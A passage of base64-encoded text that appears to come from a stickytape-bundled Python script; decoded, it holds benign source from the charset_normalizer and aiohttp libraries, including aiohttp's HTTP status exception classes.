0dXJuIFwndXRmLTgtc2lnXCcgYW5kIGl0IGlzIGEgdmFsaWQgY29kZWMgbmFtZS5cbiAgICBpZiByIGlzIG5vdCBOb25lIGFuZCBlbmNvZGluZyA9PSAidXRmXzgiIGFuZCByLmJvbTpcbiAgICAgICAgZW5jb2RpbmcgKz0gIl9zaWciXG5cbiAgICByZXR1cm4ge1xuICAgICAgICAiZW5jb2RpbmciOiBlbmNvZGluZ1xuICAgICAgICBpZiBlbmNvZGluZyBub3QgaW4gQ0hBUkRFVF9DT1JSRVNQT05ERU5DRVxuICAgICAgICBlbHNlIENIQVJERVRfQ09SUkVTUE9OREVOQ0VbZW5jb2RpbmddLFxuICAgICAgICAibGFuZ3VhZ2UiOiBsYW5ndWFnZSxcbiAgICAgICAgImNvbmZpZGVuY2UiOiBjb25maWRlbmNlLFxuICAgIH1cblxuXG5jbGFzcyBDaGFyc2V0Tm9ybWFsaXplck1hdGNoKENoYXJzZXRNYXRjaCk6XG4gICAgcGFzc1xuXG5cbmNsYXNzIENoYXJzZXROb3JtYWxpemVyTWF0Y2hlcyhDaGFyc2V0TWF0Y2hlcyk6XG4gICAgQHN0YXRpY21ldGhvZFxuICAgIGRlZiBmcm9tX2ZwKCphcmdzLCAqKmt3YXJncyk6ICAjIHR5cGU6IGlnbm9yZVxuICAgICAgICB3YXJuaW5ncy53YXJuKCAgIyBwcmFnbWE6IG5vY292ZXJcbiAgICAgICAgICAgICJzdGF0aWNtZXRob2QgZnJvbV9mcCwgZnJvbV9ieXRlcywgZnJvbV9wYXRoIGFuZCBub3JtYWxpemUgYXJlIGRlcHJlY2F0ZWQgIlxuICAgICAgICAgICAgImFuZCBzY2hlZHVsZWQgdG8gYmUgcmVtb3ZlZCBpbiAzLjAiLFxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxuICAgICAgICApXG4gICAgICAgIHJldHVybiBmcm9tX2ZwKCphcmdzLCAqKmt3YXJncykgICMgcHJhZ21hOiBub2NvdmVyXG5cbiAgICBAc3RhdGljbWV0aG9kXG4gICAgZGVmIGZyb21fYnl0ZXMoKmFyZ3MsICoqa3dhcmdzKTogICMgdHlwZTogaWdub3JlXG4gICAgICAgIHdhcm5pbmdzLndhcm4oICAjIHByYWdtYTogbm9jb3ZlclxuICAgICAgICAgICAgInN0YXRpY21ldGhvZCBmcm9tX2ZwLCBmcm9tX2J5dGVzLCBmcm9tX3BhdGggYW5kIG5vcm1hbGl6ZSBhcmUgZGVwcmVjYXRlZCAiXG4gICAgICAgICAgICAiYW5kIHNjaGVkdWxlZCB0byBiZSByZW1vdmVkIGluIDMuMCIsXG4gICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsXG4gICAgICAgIClcbiAgICAgICAgcmV0dXJuIGZyb21fYnl0ZXMoKmFyZ3MsICoqa3dhcmdzKSAgIyBwcmFnbWE6IG5vY292ZXJcblxuICAgIEBzdGF0aWNtZXRob2RcbiAgICBkZWYgZnJvbV9wYXRoKCphcmdzLCAqKmt3YXJncyk6ICAjIHR5cGU6IGlnbm9yZVxuICAgICAgICB3YXJuaW5ncy53YXJuKCAgIyBwcmFnbWE6IG5vY292ZXJcbiAgICAgICAgICAgICJzdGF0aWNtZXRob2QgZnJvbV9mcCwgZnJvbV9ieXRlcywgZnJvbV9wYXRoIGFuZCBub3JtYWxpemUgYXJlIGRlcHJlY2F0ZWQgIlxuICAgICAgICAgICAgImFuZCBzY2hlZHVsZWQgdG8gYmUgcmVtb3ZlZCBpbiAzLjAiLFxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxuICAgICAgICApXG4gICAgICAgIHJldHVybiBmcm9tX3BhdGgoKmFyZ3MsICoqa3dhcmdzKSAgIyBwcmFnbWE6IG5vY292ZXJcblxuICAgIEBzdGF0aWNtZXRob2RcbiAgICBkZWYgbm9ybWFsaXplKCphcmdzLCAqKmt3YXJncyk6ICAjIHR5cGU6IGlnbm9yZVxuICAgICAgICB3YXJuaW5ncy53YXJuKCAgIyBwcmFnbWE6IG5vY292ZXJcbiAgICAgICAgICAgICJzdGF0aWNtZXRob2QgZnJvbV9mcCwgZnJvbV9ieXRlcywgZnJvbV9wYXRoIGFuZCBub3JtYWxpemUgYXJlIGRlcHJlY2F0ZWQgIlxuICAgICAgICAgICAgImFuZCBzY2hlZHVsZWQgdG8gYmUgcmVtb3ZlZCBpbiAzLjAiLFxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxuICAgICAgICApXG4gICAgICAgIHJldHVybiBub3JtYWxpemUoKmFyZ3MsICoqa3dhcmdzKSAgIyBwcmFnbWE6IG5vY292ZXJcblxuXG5jbGFzcyBDaGFyc2V0RGV0ZWN0b3IoQ2hhcnNldE5vcm1hbGl6ZXJNYXRjaGVzKTpcbiAgICBwYXNzXG5cblxuY2xhc3MgQ2hhcnNldERvY3RvcihDaGFyc2V0Tm9ybWFsaXplck1hdGNoZXMpOlxuICAgIHBhc3NcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjaGFyc2V0X25vcm1hbGl6ZXIvdmVyc2lvbi5weScsIGInIiIiXG5FeHBvc2UgdmVyc2lvblxuIiIiXG5cbl9fdmVyc2lvbl9fID0gIjIuMC4xMiJcblZFUlNJT04gPSBfX3ZlcnNpb25fXy5zcGxpdCgiLiIpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC93ZWJfZXhjZXB0aW9ucy5weScsIGInaW1wb3J0IHdhcm5pbmdzXHJcbmZyb20gdHlwaW5nIGltcG9ydCBBbnksIERpY3QsIEl0ZXJhYmxlLCBMaXN0LCBPcHRpb25hbCwgU2V0ICAjIG5vcWFcclxuXHJcbmZyb20geWFybCBpbXBvcnQgVVJMXHJcblxyXG5mcm9tIC50eXBlZGVmcyBpbXBvcnQgTG9vc2VIZWFkZXJzLCBTdHJPclVSTFxyXG5mcm9tIC53ZWJfcmVzcG9uc2UgaW1wb3J0IFJlc3BvbnNlXHJcblxyXG5fX2FsbF9fID0gKFxyXG4gICAgIkhUVFBFeGNlcHRpb24iLFxyXG4gICAgIkhUVFBFcnJvciIsXHJcbiAgICAiSFRUUFJlZGlyZWN0aW9uIixcclxuICAgICJIVFRQU3VjY2Vzc2Z1bCIsXHJcbiAgICAiSFRUUE9rIixcclxuICAgICJIVFRQQ3JlYXRlZCIsXHJcbiAgICAiSFRUUEFjY2VwdGVkIixcclxuICAgICJIVFRQTm9uQXV0aG9yaXRhdGl2ZUluZm9ybWF0aW9uIixcclxuICAgICJIVFRQTm9Db250ZW50IixcclxuICAgICJIVFRQUmVzZXRDb250ZW50IixcclxuICAgICJIVFRQUGFydGlhbENvbnRlbnQiLFxyXG4gICAgIkhUVFBNdWx0aXBsZUNob2ljZXMiLFxyXG4gICAgIkhUVFBNb3ZlZFBlcm1hbmVudGx5IixcclxuICAgICJIVFRQRm91bmQiLFxyXG4gICAgIkhUVFBTZWVPdGhlciIsXHJcbiAgICAiSFRUUE5vdE1vZGlmaWVkIixcclxuICAgICJIVFRQVXNlUHJveHkiLFxyXG4gICAgIkhUVFBUZW1wb3JhcnlSZWRpcmVjdCIsXHJcbiAgICAiSFRUUFBlcm1hbmVudFJlZGlyZWN0IixcclxuICAgICJIVFRQQ2xpZW50RXJyb3IiLFxyXG4gICAgIkhUVFBCYWRSZXF1ZXN0IixcclxuICAgICJIVFRQVW5hdXRob3JpemVkIixcclxuICAgICJIVFRQUGF5bWVudFJlcXVpcmVkIixcclxuICAgICJIVFRQRm9yYmlkZGVuIixcclxuICAgICJIVFRQTm90Rm91bmQiLFxyXG4gICAgIkhUVFBNZXRob2ROb3RBbGxvd2VkIixcclxuICAgICJIVFRQTm90QWNjZXB0YWJsZSIsXHJcbiAgICAiSFRUUFByb3h5QXV0aGVudGljYXRpb25SZXF1aXJlZCIsXHJcbiAgICAiSFRUUFJlcXVlc3RUaW1lb3V0IixcclxuICAgICJIVFRQQ29uZmxpY3QiLFxyXG4gICAgIkhUVFBHb25lIixcclxuICAgICJIVFRQTGVuZ3RoUmVxdWlyZWQiLFxyXG4gICAgIkhUVFBQcmVjb25kaXRpb25GYWlsZWQiLFxyXG4gICAgIkhUVFBSZXF1ZXN0RW50aXR5VG9vTGFyZ2UiLFxyXG4gICAgIkhUVFBSZXF1ZXN0VVJJVG9vTG9uZyIsXHJcbiAgICAiSFRUUFVuc3VwcG9ydGVkTWVkaWFUeXBlIixcclxuICAgICJIVFRQUmVxdWVzdFJhbmdlTm90U2F0aXNmaWFibGUiLFxyXG4gICAgIkhUVFBFeHBlY3RhdGlvbkZhaWxlZCIsXHJcbiAgICAiSFRUUE1pc2RpcmVjdGVkUmVxdWVzdCIsXHJcbiAgICAiSFRUUFVucHJvY2Vzc2FibGVFbnRpdHkiLFxyXG4gICAgIkhUVFBGYWlsZWREZXBlbmRlbmN5IixcclxuICAgICJIVFRQVXBncmFkZVJlcXVpcmVkIixcclxuICAgICJIVFRQUHJlY29uZGl0aW9uUmVxdWlyZWQiLFxyXG4gICAgIkhUVFBUb29NYW55UmVxdWVzdHMiLFxyXG4gICAgIkhUVFBSZXF1ZXN0SGVhZGVyRmllbGRzVG9vTGFyZ2UiLFxyXG4gICAgIkhUVFBVbmF2YWlsYWJsZUZvckxlZ2FsUmVhc29ucyIsXHJcbiAgICAiSFRUUFNlcnZlckVycm9yIixcclxuICAgICJIVFRQSW50ZXJuYWxTZXJ2ZXJFcnJvciIsXHJcbiAgICAiSFRUUE5vdEltcGxlbWVudGVkIixcclxuICAgICJIVFRQQmFkR2F0ZXdheSIsXHJcbiAgICAiSFRUUFNlcnZpY2VVbmF2YWlsYWJsZSIsXHJcbiAgICAiSFRUUEdhdGV3YXlUaW1lb3V0IixcclxuICAgICJIVFRQVmVyc2lvbk5vdFN1cHBvcnRlZCIsXHJcbiAgICAiSFRUUFZhcmlhbnRBbHNvTmVnb3RpYXRlcyIsXHJcbiAgICAiSFRUUEluc3VmZmljaWVudFN0b3JhZ2UiLFxyXG4gICAgIkhUVFBOb3RFeHRlbmRlZCIsXHJcbiAgICAiSFRUUE5ldHdvcmtBdXRoZW50aWNhdGlvblJlcXVpcmVkIixcclxuKVxyXG5cclxuXHJcbiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xyXG4jIEhUVFAgRXhjZXB0aW9uc1xyXG4jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcclxuXHJcblxyXG5jbGFzcyBIVFRQRXhjZXB0aW9uKFJlc3BvbnNlLCBFeGNlcHRpb24pOlxyXG5cclxuICAgICMgWW91IHNob3VsZCBzZXQgaW4gc3ViY2xhc3NlczpcclxuICAgICMgc3RhdHVzID0gMjAwXHJcblxyXG4gICAgc3RhdHVzX2NvZGUgPSAtMVxyXG4gICAgZW1wdHlfYm9keSA9IEZhbHNlXHJcblxyXG4gICAgX19odHRwX2V4Y2VwdGlvbl9fID0gVHJ1ZVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgaGVhZGVyczogT3B0aW9uYWxbTG9vc2VIZWFkZXJzXSA9IE5vbmUsXHJcbiAgICAgICAgcmVhc29uOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBib2R5OiBBbnkgPSBOb25lLFxyXG4gICAgICAgIHRleHQ6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIGNvbnRlbnRfdHlwZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgYm9keSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICJib2R5IGFyZ3VtZW50IGlzIGRlcHJlY2F0ZWQgZm9yIGh0dHAgd2ViIGV4Y2VwdGlvbnMiLFxyXG4gICAgICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgUmVzcG9uc2UuX19pbml0X18oXHJcbiAgICAgICAgICAgIHNlbGYsXHJcbiAgICAgICAgICAgIHN0YXR1cz1zZWxmLnN0YXR1c19jb2RlLFxyXG4gICAgICAgICAgICBoZWFkZXJzPWhlYWRlcnMsXHJcbiAgICAgICAgICAgIHJlYXNvbj1yZWFzb24sXHJcbiAgICAgICAgICAgIGJvZHk9Ym9keSxcclxuICAgICAgICAgICAgdGV4dD10ZXh0LFxyXG4gICAgICAgICAgICBjb250ZW50X3R5cGU9Y29udGVudF90eXBlLFxyXG4gICAgICAgIClcclxuICAgICAgICBFeGNlcHRpb24uX19pbml0X18oc2VsZiwgc2VsZi5yZWFzb24pXHJcbiAgICAgICAgaWYgc2VsZi5ib2R5IGlzIE5vbmUgYW5kIG5vdCBzZWxmLmVtcHR5X2JvZHk6XHJcbiAgICAgICAgICAgIHNlbGYudGV4dCA9IGYie3NlbGYuc3RhdHVzfToge3NlbGYucmVhc29ufSJcclxuXHJcbiAgICBkZWYgX19ib29sX18oc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gVHJ1ZVxyXG5cclxuXHJcbmNsYXNzIEhUVFBFcnJvcihIVFRQRXhjZXB0aW9uKTpcclxuICAgICIiIkJhc2UgY2xhc3MgZm9yIGV4Y2VwdGlvbnMgd2l0aCBzdGF0dXMgY29kZXMgaW4gdGhlIDQwMHMgYW5kIDUwMHMuIiIiXHJcblxyXG5cclxuY2xhc3MgSFRUUFJlZGlyZWN0aW9uKEhUVFBFeGNlcHRpb24pOlxyXG4gICAgIiIiQmFzZSBjbGFzcyBmb3IgZXhjZXB0aW9ucyB3aXRoIHN0YXR1cyBjb2RlcyBpbiB0aGUgMzAwcy4iIiJcclxuXHJcblxyXG5jbGFzcyBIVFRQU3VjY2Vzc2Z1bChIVFRQRXhjZXB0aW9uKTpcclxuICAgICIiIkJhc2UgY2xhc3MgZm9yIGV4Y2VwdGlvbnMgd2l0aCBzdGF0dXMgY29kZXMgaW4gdGhlIDIwMHMuIiIiXHJcblxyXG5cclxuY2xhc3MgSFRUUE9rKEhUVFBTdWNjZXNzZnVsKTpcclxuICAgIHN0YXR1c19jb2RlID0gMjAwXHJcblxyXG5cclxuY2xhc3MgSFRUUENyZWF0ZWQoSFRUUFN1Y2Nlc3NmdWwpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSAyMDFcclxuXHJcblxyXG5jbGFzcyBIVFRQQWNjZXB0ZWQoSFRUUFN1Y2Nlc3NmdWwpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSAyMDJcclxuXHJcblxyXG5jbGFzcyBIVFRQTm9uQXV0aG9yaXRhdGl2ZUluZm9ybWF0aW9uKEhUVFBTdWNjZXNzZnVsKTpcclxuICAgIHN0YXR1c19jb2RlID0gMjAzXHJcblxyXG5cclxuY2xhc3MgSFRUUE5vQ29udGVudChIVFRQU3VjY2Vzc2Z1bCk6XHJcbiAgICBzdGF0dXNfY29kZSA9IDIwNFxyXG4gICAgZW1wdHlfYm9keSA9IFRydWVcclxuXHJcblxyXG5jbGFzcyBIVFRQUmVzZXRDb250ZW50KEhUVFBTdWNjZXNzZnVsKTpcclxuICAgIHN0YXR1c19jb2RlID0gMjA1XHJcbiAgICBlbXB0eV9ib2R5ID0gVHJ1ZVxyXG5cclxuXHJcbmNsYXNzIEhUVFBQYXJ0aWFsQ29udGVudChIVFRQU3VjY2Vzc2Z1bCk6XHJcbiAgICBzdGF0dXNfY29kZSA9IDIwNlxyXG5cclxuXHJcbiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xyXG4jIDN4eCByZWRpcmVjdGlvblxyXG4jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcclxuXHJcblxyXG5jbGFzcyBfSFRUUE1vdmUoSFRUUFJlZGlyZWN0aW9uKTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGxvY2F0aW9uOiBTdHJPclVSTCxcclxuICAgICAgICAqLFxyXG4gICAgICAgIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgICAgIHJlYXNvbjogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgYm9keTogQW55ID0gTm9uZSxcclxuICAgICAgICB0ZXh0OiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBjb250ZW50X3R5cGU6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBsb2NhdGlvbjpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiSFRUUCByZWRpcmVjdHMgbmVlZCBhIGxvY2F0aW9uIHRvIHJlZGlyZWN0IHRvLiIpXHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhcclxuICAgICAgICAgICAgaGVhZGVycz1oZWFkZXJzLFxyXG4gICAgICAgICAgICByZWFzb249cmVhc29uLFxyXG4gICAgICAgICAgICBib2R5PWJvZHksXHJcbiAgICAgICAgICAgIHRleHQ9dGV4dCxcclxuICAgICAgICAgICAgY29udGVudF90eXBlPWNvbnRlbnRfdHlwZSxcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5oZWFkZXJzWyJMb2NhdGlvbiJdID0gc3RyKFVSTChsb2NhdGlvbikpXHJcbiAgICAgICAgc2VsZi5sb2NhdGlvbiA9IGxvY2F0aW9uXHJcblxyXG5cclxuY2xhc3MgSFRUUE11bHRpcGxlQ2hvaWNlcyhfSFRUUE1vdmUpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSAzMDBcclxuXHJcblxyXG5jbGFzcyBIVFRQTW92ZWRQZXJtYW5lbnRseShfSFRUUE1vdmUpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSAzMDFcclxuXHJcblxyXG5jbGFzcyBIVFRQRm91bmQoX0hUVFBNb3ZlKTpcclxuICAgIHN0YXR1c19jb2RlID0gMzAyXHJcblxyXG5cclxuIyBUaGlzIG9uZSBpcyBzYWZlIGFmdGVyIGEgUE9TVCAodGhlIHJlZGlyZWN0ZWQgbG9jYXRpb24gd2lsbCBiZVxyXG4jIHJldHJpZXZlZCB3aXRoIEdFVCk6XHJcbmNsYXNzIEhUVFBTZWVPdGhlcihfSFRUUE1vdmUpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSAzMDNcclxuXHJcblxyXG5jbGFzcyBIVFRQTm90TW9kaWZpZWQoSFRUUFJlZGlyZWN0aW9uKTpcclxuICAgICMgRklYTUU6IHRoaXMgc2hvdWxkIGluY2x1ZGUgYSBkYXRlIG9yIGV0YWcgaGVhZGVyXHJcbiAgICBzdGF0dXNfY29kZSA9IDMwNFxyXG4gICAgZW1wdHlfYm9keSA9IFRydWVcclxuXHJcblxyXG5jbGFzcyBIVFRQVXNlUHJveHkoX0hUVFBNb3ZlKTpcclxuICAgICMgTm90IGEgbW92ZSwgYnV0IGxvb2tzIGEgbGl0dGxlIGxpa2Ugb25lXHJcbiAgICBzdGF0dXNfY29kZSA9IDMwNVxyXG5cclxuXHJcbmNsYXNzIEhUVFBUZW1wb3JhcnlSZWRpcmVjdChfSFRUUE1vdmUpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSAzMDdcclxuXHJcblxyXG5jbGFzcyBIVFRQUGVybWFuZW50UmVkaXJlY3QoX0hUVFBNb3ZlKTpcclxuICAgIHN0YXR1c19jb2RlID0gMzA4XHJcblxyXG5cclxuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXHJcbiMgNHh4IGNsaWVudCBlcnJvclxyXG4jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcclxuXHJcblxyXG5jbGFzcyBIVFRQQ2xpZW50RXJyb3IoSFRUUEVycm9yKTpcclxuICAgIHBhc3NcclxuXHJcblxyXG5jbGFzcyBIVFRQQmFkUmVxdWVzdChIVFRQQ2xpZW50RXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA0MDBcclxuXHJcblxyXG5jbGFzcyBIVFRQVW5hdXRob3JpemVkKEhUVFBDbGllbnRFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDQwMVxyXG5cclxuXHJcbmNsYXNzIEhUVFBQYXltZW50UmVxdWlyZWQoSFRUUENsaWVudEVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNDAyXHJcblxyXG5cclxuY2xhc3MgSFRUUEZvcmJpZGRlbihIVFRQQ2xpZW50RXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA0MDNcclxuXHJcblxyXG5jbGFzcyBIVFRQTm90Rm91bmQoSFRUUENsaWVudEVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNDA0XHJcblxyXG5cclxuY2xhc3MgSFRUUE1ldGhvZE5vdEFsbG93ZWQoSFRUUENsaWVudEVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNDA1XHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbWV0aG9kOiBzdHIsXHJcbiAgICAgICAgYWxsb3dlZF9tZXRob2RzOiBJdGVyYWJsZVtzdHJdLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgaGVhZGVyczogT3B0aW9uYWxbTG9vc2VIZWFkZXJzXSA9IE5vbmUsXHJcbiAgICAgICAgcmVhc29uOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBib2R5OiBBbnkgPSBOb25lLFxyXG4gICAgICAgIHRleHQ6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIGNvbnRlbnRfdHlwZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgYWxsb3cgPSAiLCIuam9pbihzb3J0ZWQoYWxsb3dlZF9tZXRob2RzKSlcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKFxyXG4gICAgICAgICAgICBoZWFkZXJzPWhlYWRlcnMsXHJcbiAgICAgICAgICAgIHJlYXNvbj1yZWFzb24sXHJcbiAgICAgICAgICAgIGJvZHk9Ym9keSxcclxuICAgICAgICAgICAgdGV4dD10ZXh0LFxyXG4gICAgICAgICAgICBjb250ZW50X3R5cGU9Y29udGVudF90eXBlLFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLmhlYWRlcnNbIkFsbG93Il0gPSBhbGxvd1xyXG4gICAgICAgIHNlbGYuYWxsb3dlZF9tZXRob2RzID0gc2V0KGFsbG93ZWRfbWV0aG9kcykgICMgdHlwZTogU2V0W3N0cl1cclxuICAgICAgICBzZWxmLm1ldGhvZCA9IG1ldGhvZC51cHBlcigpXHJcblxyXG5cclxuY2xhc3MgSFRUUE5vdEFjY2VwdGFibGUoSFRUUENsaWVudEVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNDA2XHJcblxyXG5cclxuY2xhc3MgSFRUUFByb3h5QXV0aGVudGljYXRpb25SZXF1aXJlZChIVFRQQ2xpZW50RXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA0MDdcclxuXHJcblxyXG5jbGFzcyBIVFRQUmVxdWVzdFRpbWVvdXQoSFRUUENsaWVudEVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNDA4XHJcblxyXG5cclxuY2xhc3MgSFRUUENvbmZsaWN0KEhUVFBDbGllbnRFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDQwOVxyXG5cclxuXHJcbmNsYXNzIEhUVFBHb25lKEhUVFBDbGllbnRFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDQxMFxyXG5cclxuXHJcbmNsYXNzIEhUVFBMZW5ndGhSZXF1aXJlZChIVFRQQ2xpZW50RXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA0MTFcclxuXHJcblxyXG5jbGFzcyBIVFRQUHJlY29uZGl0aW9uRmFpbGVkKEhUVFBDbGllbnRFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDQxMlxyXG5cclxuXHJcbmNsYXNzIEhUVFBSZXF1ZXN0RW50aXR5VG9vTGFyZ2UoSFRUUENsaWVudEVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNDEzXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIG1heF9zaXplOiBmbG9hdCwgYWN0dWFsX3NpemU6IGZsb2F0LCAqKmt3YXJnczogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIGt3YXJncy5zZXRkZWZhdWx0KFxyXG4gICAgICAgICAgICAidGV4dCIsXHJcbiAgICAgICAgICAgICJNYXhpbXVtIHJlcXVlc3QgYm9keSBzaXplIHt9IGV4Y2VlZGVkLCAiXHJcbiAgICAgICAgICAgICJhY3R1YWwgYm9keSBzaXplIHt9Ii5mb3JtYXQobWF4X3NpemUsIGFjdHVhbF9zaXplKSxcclxuICAgICAgICApXHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXygqKmt3YXJncylcclxuXHJcblxyXG5jbGFzcyBIVFRQUmVxdWVzdFVSSVRvb0xvbmcoSFRUUENsaWVudEVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNDE0XHJcblxyXG5cclxuY2xhc3MgSFRUUFVuc3VwcG9ydGVkTWVkaWFUeXBlKEhUVFBDbGllbnRFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDQxNVxyXG5cclxuXHJcbmNsYXNzIEhUVFBSZXF1ZXN0UmFuZ2VOb3RTYXRpc2ZpYWJsZShIVFRQQ2xpZW50RXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA0MTZcclxuXHJcblxyXG5jbGFzcyBIVFRQRXhwZWN0YXRpb25GYWlsZWQoSFRUUENsaWVudEVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNDE3XHJcblxyXG5cclxuY2xhc3MgSFRUUE1pc2RpcmVjdGVkUmVxdWVzdChIVFRQQ2xpZW50RXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA0MjFcclxuXHJcblxyXG5jbGFzcyBIVFRQVW5wcm9jZXNzYWJsZUVudGl0eShIVFRQQ2xpZW50RXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA0MjJcclxuXHJcblxyXG5jbGFzcyBIVFRQRmFpbGVkRGVwZW5kZW5jeShIVFRQQ2xpZW50RXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA0MjRcclxuXHJcblxyXG5jbGFzcyBIVFRQVXBncmFkZVJlcXVpcmVkKEhUVFBDbGllbnRFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDQyNlxyXG5cclxuXHJcbmNsYXNzIEhUVFBQcmVjb25kaXRpb25SZXF1aXJlZChIVFRQQ2xpZW50RXJyb3IpOlxyXG4gICAgc3RhdHVzX2NvZGUgPSA0MjhcclxuXHJcblxyXG5jbGFzcyBIVFRQVG9vTWFueVJlcXVlc3RzKEhUVFBDbGllbnRFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDQyOVxyXG5cclxuXHJcbmNsYXNzIEhUVFBSZXF1ZXN0SGVhZGVyRmllbGRzVG9vTGFyZ2UoSFRUUENsaWVudEVycm9yKTpcclxuICAgIHN0YXR1c19jb2RlID0gNDMxXHJcblxyXG5cclxuY2xhc3MgSFRUUFVuYXZhaWxhYmxlRm9yTGVnYWxSZWFzb25zKEhUVFBDbGllbnRFcnJvcik6XHJcbiAgICBzdGF0dXNfY29kZSA9IDQ1MVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGxpbms6IHN0cixcclxuICAgICAgICAqLFxyXG4gICAgICAgIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgICAgIHJlYXNvbjogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgYm9keTogQW55ID0gTm9uZSxcclxuICAgICAgICB0ZXh0OiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBjb250ZW50X3R5cGU6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oXHJcbiAgICAgICAgICAgIGhlYWRlcnM9aGVhZGVycyxcclxuICAgICAgICAgICAgcmVhc29uPXJlYXNvbixcclxuICAgICAgICAgICAgYm9keT1ib2R5LFxyXG4gICAgICAgICAgICB0ZXh0PXRleHQsXHJcbiAgICAgICAgICAgIGNvbnRlbnRfdHlwZT1jb250ZW50X3R5cGUsXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuaGVhZGVyc1siTGluayJdID0gXCc8JXM+OyByZWw9